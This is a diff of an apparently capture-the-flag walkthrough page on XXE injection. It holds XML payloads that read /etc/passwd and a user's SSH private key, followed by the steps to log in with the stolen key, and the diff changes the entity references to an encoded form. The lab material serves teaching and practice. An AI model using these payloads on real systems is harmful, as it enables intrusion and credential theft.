@@ -198,11 +198,11 @@ Use `firefox` to load url `http://<ip>` and try the below payloads.
 {% capture code %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
   <userInfo>
     <firstName>falcon</firstName>
-    <lastName>&name;</lastName>
+    <lastName>&#038;name;</lastName>
   </userInfo>{% endcapture %} {% include code.html code=code%}
 
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>{% endcapture %} {% include code.html code=code%}
+<root>&#038;read;</root>{% endcapture %} {% include code.html code=code%}
 
 The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
 
@@ -213,11 +213,11 @@ Use `firefox` to load the url `http://<ip>`
 
 Use the following payloads to get the contents of `/etc/passwd`.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>{% endcapture %} {% include code.html code=code%}
+<root>&#038;read;</root>{% endcapture %} {% include code.html code=code%}
 
 There is one non-system user. Use the following payload to read the user's rsa private key.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&read;</root>{% endcapture %} {% include code.html code=code%}
+<root>&#038;read;</root>{% endcapture %} {% include code.html code=code%}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
